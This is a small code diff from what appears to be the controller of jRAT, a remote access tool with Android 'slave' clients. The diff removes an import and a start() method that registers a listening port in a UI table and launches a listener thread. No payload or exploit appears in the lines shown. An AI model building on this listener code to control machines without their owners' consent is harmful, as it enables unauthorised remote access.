@@ -9,7 +9,6 @@ import se.jrat.client.android.AndroidSlave;
 import se.jrat.client.exceptions.CloseException;
 import se.jrat.client.settings.Sockets;
 import se.jrat.client.ui.panels.PanelMainLog;
-import se.jrat.client.ui.panels.PanelMainSockets;
 import se.jrat.common.ConnectionCodes;
 
 
@@ -52,13 +51,5 @@ public class ServerListener extends PortListener implements Runnable {
 			ex.printStackTrace();
 		}
 	}
-
-	public void start() {
-		PanelMainSockets.instance.getModel().addRow(new Object[] { "Listening", name, server.getLocalPort(), timeout, pass });
-
-		new Thread(this, "Port " + server.getLocalPort()).start();
-	}
-
-	
 
 }
